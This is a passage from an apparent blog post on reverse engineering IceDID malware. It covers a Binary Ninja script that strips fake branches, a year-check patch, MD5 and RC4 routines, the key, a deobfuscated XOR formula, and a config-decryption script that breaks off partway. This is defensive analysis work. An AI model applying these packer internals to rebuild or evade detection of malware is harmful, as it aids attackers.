&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmp_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jmp_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;je&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">always_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jne&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">never_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jz&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">always_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jnz&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">never_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[!] Unhandled jmp @ 0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">convert_to_nop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">remove_fake_branches&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">n_patched&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_function_at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">basic_block&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">basic_blocks&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">find_fake_jmps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basic_block&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">fj&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">fake_jmps&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">patch_fake_jmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fj&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">n_patched&lt;/span> &lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">begin_undo_actions&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">remove_fake_branches&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7ffd00e31000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">commit_undo_actions&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Also, from reading this &lt;a class="link" href="https://binary.ninja/2023/11/13/obfuscation-flare-on.html" target="_blank" rel="noopener"
>article&lt;/a> you will need to disable &lt;code>Tail Call Analysis&lt;/code> in whatever tool you are using, otherwise, the psuedo c view will not be as concise as it could be.
And just like that, the control flow becomes so much easier to read.
Ngl, seeing this happen in real time was very satisfying.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5.png"
width="250"
height="908"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5_hu01f062533f9732c7e45e256f225ddc72_9966_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5_hu01f062533f9732c7e45e256f225ddc72_9966_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Before"
class="gallery-image"
data-flex-grow="27"
data-flex-basis="66px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6.png"
width="461"
height="729"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6_hu7df3c03cfc00fab6ad101d34e7f33174_3656_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6_hu7df3c03cfc00fab6ad101d34e7f33174_3656_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="After"
class="gallery-image"
data-flex-grow="63"
data-flex-basis="151px"
>&lt;/p>
&lt;p>If we follow the function calls in this now super flattened function, we end up at what looks to be a function that does some api hashing, and uses stack strings.
I set breakpoints at these calls so I could figure out what api it was grabbing.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7.png"
width="580"
height="904"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7_hud069344d5fa12ff8093eb6e3db7704b0_124608_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7_hud069344d5fa12ff8093eb6e3db7704b0_124608_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Main code"
class="gallery-image"
data-flex-grow="64"
data-flex-basis="153px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8.png"
width="728"
height="178"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8_hu0bc76c6a497de1d0d59a223c83ec6ad5_20761_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8_hu0bc76c6a497de1d0d59a223c83ec6ad5_20761_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Looks like it wants to do something with a window?"
class="gallery-image"
data-flex-grow="408"
data-flex-basis="981px"
>&lt;/p>
&lt;p>I also found a check where the malware will only run its attack if the year is &lt;code>2022&lt;/code>.
I ended up patching this instruction to always jump in &lt;code>x64dbg&lt;/code>.
&lt;code>EnumWindows&lt;/code> accepts a callback function, which is a prime candidate for inserting a malicous function, so I decided to explore that next.&lt;/p>
&lt;h3 id="callback-function">Callback function
&lt;/h3>&lt;p>Again, this function has a lot of fake branches, so prune those first.
The callback function seems to just get a handle to a windows, then it enters a function that seems to be doing some type of memory copying operations.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9.png"
width="543"
height="303"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9_huf227c3ced8365a1cce63fc2ccf44b83b_22090_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9_huf227c3ced8365a1cce63fc2ccf44b83b_22090_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Maybe COM injection?"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="430px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10.png"
width="815"
height="907"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10_hu5447177a1eea6341be61c562312ef216_96364_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10_hu5447177a1eea6341be61c562312ef216_96364_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Maybe this is the unpacking routine?"
class="gallery-image"
data-flex-grow="89"
data-flex-basis="215px"
>&lt;/p>
&lt;p>Following along some of the function calls results in finding what seems to be a promising function.
It seems to create a string &lt;code>|SPL|&lt;/code>
Doing some OSINT reveals that this might be an IoC for &lt;code>SplPacker&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11.png"
width="825"
height="624"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11_hudc81d96d09dbec768134a7d4a5021c5f_76254_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11_hudc81d96d09dbec768134a7d4a5021c5f_76254_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" What is SPL?"
class="gallery-image"
data-flex-grow="132"
data-flex-basis="317px"
>&lt;/p>
&lt;p>There is also a string &lt;code>DllRegisterServer&lt;/code> that is created dynamically, so thats something else to watch out for.
Since it seems that this is modifying memory and potentially unpacking something, I figured it might be easier at this point to just reverse this part dynamically.
Also, Binja isn&amp;rsquo;t correctly deducing the function calls to these resolved APIs, so we need to define them ourselves and then change their type.
We can do this by creating new types:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12.png"
width="715"
height="577"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12_huff7c79d00c601bdcb7c25892699f338c_25396_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12_huff7c79d00c601bdcb7c25892699f338c_25396_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" All the calls just need to follow this pattern "
class="gallery-image"
data-flex-grow="123"
data-flex-basis="297px"
>&lt;/p>
&lt;p>I quickly arrive at a function that is doing some type of hashing.
It doesn&amp;rsquo;t specify what type of hashing to do, so the process will use the default value, which I am unsure of what it would be.
ChatGPT says this would be using &lt;code>PROV_RSA_FULL&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13.png"
width="740"
height="733"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13_hu66444dfd47d9c9d7f9ff6312457ddb22_97919_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13_hu66444dfd47d9c9d7f9ff6312457ddb22_97919_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Hashing function? "
class="gallery-image"
data-flex-grow="100"
data-flex-basis="242px"
>&lt;/p>
&lt;p>When stepping through &lt;code>x64dbg&lt;/code>, I saw it was using &lt;code>ALG_ID&lt;/code> of &lt;code>8003&lt;/code> which corresponds to md5.
Also, I am able to obtain a few more hashes:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14.png"
width="680"
height="98"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14_hud2e5b0d3f022614b54d09826e154658d_17997_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14_hud2e5b0d3f022614b54d09826e154658d_17997_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" More hashes obtained. "
class="gallery-image"
data-flex-grow="693"
data-flex-basis="1665px"
>&lt;/p>
&lt;p>Also, as I stepped through some of the functions I found what looked to be RC4 encryption algo.
This assumption was based on the fact that it had 3 loops, each with 256 iterations, which matches up with the profile of RC4.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15.png"
width="1064"
height="912"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15_hu3201af0a0d80690875d8c0c4f84a82e2_144270_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15_hu3201af0a0d80690875d8c0c4f84a82e2_144270_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" RC4 "
class="gallery-image"
data-flex-grow="116"
data-flex-basis="280px"
>&lt;/p>
&lt;h3 id="decryption">Decryption
&lt;/h3>&lt;p>There are 2 references to this RC4 function, so I labeled them as potential decryption functions.
In both of these references, a key of &lt;code>0x11c742c6&lt;/code> is used.
There is also another function that does some type of encryption or encoding using the same data, key, and key length, although I wasn&amp;rsquo;t able to understand it at the time.
Additionally, from the references to the data and key, I was able to deduce that the code is using this structure:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">data_block&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">pdata&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">data_len&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>It passes references to this structure to its encryption routines.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16.png"
width="1303"
height="620"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16_hu2ffb72f1c754a302111291b414786e32_100807_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16_hu2ffb72f1c754a302111291b414786e32_100807_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Not sure what this does "
class="gallery-image"
data-flex-grow="210"
data-flex-basis="504px"
>&lt;/p>
&lt;p>At this point, I felt that it would be easier to see how these functions are used from &lt;code>x64dbg&lt;/code>, so I went back to it.
I ended up putting an access breakpoint on the data section, so i could see when the hex strings start getting used.
Through this method I was able to figure out the following chunk of data was some type of metadata about the hexstream in the &lt;code>.data&lt;/code> section.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17.png"
width="809"
height="150"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17_hu64dd6e961fe7e970af5fd94bd963d4e5_22705_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17_hu64dd6e961fe7e970af5fd94bd963d4e5_22705_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Metadata before the hex stream "
class="gallery-image"
data-flex-grow="539"
data-flex-basis="1294px"
>&lt;/p>
&lt;p>Also, the hex stream is converted from hex to bytes, and then copies into the section created by &lt;code>NtCreateSection&lt;/code> earlier in the process.
Then the data is hashed several times, maybe to verify its integerity.
It was also at this point where I realized that the function that I had thought to be encoding was actually a second type of decryption that is applied to the data after it has been passed through the RC4 routine.
The strategy I used to do this was to check for instructions that moved data from either a stack variable or process memory to a register or vice versa.
Another hint was that this also used the same parameters as the RC4 function.
Then you see the operations that are done upon it.
The authors of this malware use an obfuscation technique in this encryption where they add values, and then subtract them, essentially restoring the original value.
The obfuscated formula for the xor encryption is:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">data[i] = (data[i] ^ key[i % len(key)])
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] -= data[i + 1]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] += 0x100 - 0x100
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] += (i % len(key)) &amp;amp; 0xFF
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] -= (i % len(key)) &amp;amp; 0xFF
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>which simplifies down to:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">data[i] = (data[i] ^ key[i % len(key)]) - data[i + 1]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Because python treats the operands of these operations as signed integers we also need to add a mask of &lt;code>0xFF&lt;/code> to cut the resulting byte/s to the right size.&lt;/p>
&lt;p>We can copy these unpacking process in binary ninja with the following script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Transform&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ADDR_OF_DATA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x7fff7a1a9040&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11c742c6&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FILENAME&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x00\x00&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">curr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fromhex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">rc4_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">KEY&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">byteorder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rc4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Transform&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;RC4&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">rc4&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;key&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">KEY&lt;/span>&lt;span class="p">):&lt;/span>
